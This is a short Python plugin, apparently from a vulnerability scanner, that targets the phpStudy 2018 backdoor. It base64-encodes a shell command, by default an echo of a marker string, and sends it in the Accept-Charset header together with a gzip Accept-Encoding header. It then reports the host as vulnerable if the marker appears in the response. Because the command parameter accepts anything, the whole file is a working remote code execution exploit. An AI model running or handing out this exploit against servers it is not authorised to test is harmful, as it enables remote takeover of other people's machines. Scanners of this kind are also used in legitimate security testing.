#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import base64
def msg():
  ret = {}
  ret['links'] = ["https://www.cnblogs.com/liliyuanshangcao/p/11584397.html"]
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "phpstudy2018后门漏洞"
  ret['level'] = "high"
  ret['ifbug'] = False
  ret['author'] = 'ppxfx'
  ret['FOFA'] = ''
  return ret

def run(url,ua,command='echo eeSzxu92nIDAb;'):
  command = base64.b64encode(command.encode('utf-8'))
  command = str(command, 'utf-8')
  ret = msg()
  headers = {
          'User-Agent': ua,
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-User': '?1',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
          'Sec-Fetch-Site': 'none',
          'accept-charset': command,#'ZWNobyBlZVN6eHU5Mm5JREFiOw==',  # 输出 eeSzxu92nIDAb
          'Accept-Encoding': 'gzip,deflate',
          'Accept-Language': 'zh-CN,zh;q=0.9',
      }

  target = '/'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "eeSzxu92nIDAb" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret